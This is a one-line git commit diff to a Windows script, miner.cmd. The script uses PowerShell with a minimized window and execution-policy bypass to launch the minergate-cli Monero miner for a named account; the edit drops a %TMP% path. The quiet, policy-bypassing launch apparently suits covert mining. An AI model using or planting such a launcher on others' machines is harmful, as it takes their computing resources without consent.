ef883ebb97fce8eb61ab6a9750bd9c9187d6aa97
mediatui <57651467+mediatui@users.noreply.github.com>
2019-12-02 15:24:33 +1300

    Update miner.cmd

--- multi/miner.cmd
+++ multi/miner.cmd
@@ -1,1 +1,1 @@
-powershell -W Minimized -Exec Bypass cmd.exe /c "%TMP%\minergate-cli.exe" --user 200813018@myacg.org --xmr 0
+powershell -W Minimized -Exec Bypass cmd.exe /c minergate-cli.exe --user 200813018@myacg.org --xmr 0
